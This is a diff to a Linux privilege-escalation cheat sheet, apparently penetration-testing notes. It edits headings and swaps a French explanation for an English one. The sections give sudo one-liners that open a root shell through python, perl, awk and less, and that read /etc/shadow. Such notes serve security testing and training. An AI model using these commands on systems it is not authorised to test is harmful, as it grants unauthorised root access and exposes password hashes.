@@ -67,17 +67,17 @@ cat /etc/ssh/ssh_host_key
 
 ## Automated enumeration
 
-## Privesc
 
-#### Sudoers
+## Sudoers - Privesc
 
-##### python privesc
+##### python
 ```
 sudo -u root /usr/bin/python
 >>> from subprocess import call
 >>> call(['/bin/bash'])
 ```
-##### perl privesc
+
+##### perl
 ```
 sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
 ```
@@ -99,12 +99,9 @@ awk 'BEGIN {system("/bin/bash")}'
 Solution 1 - read a file
 sudo -u root /usr/bin/less /etc/shadow
  
-Solution 2 - create file
+Solution 2 - create a file
 sudo -u root /usr/bin/less 
-
-Solution 2 : on obtient un shell avec les droits à de victim à l'aide de less
-Pour commencer il faut ouvrir un fichier avec less comme par exemple /etc/passwd
-Puis, il faut écrire (comme pour quitter vim et comme dans l'exemple précédent):
+then insert the following command :
 !/bin/bash
 ```
 
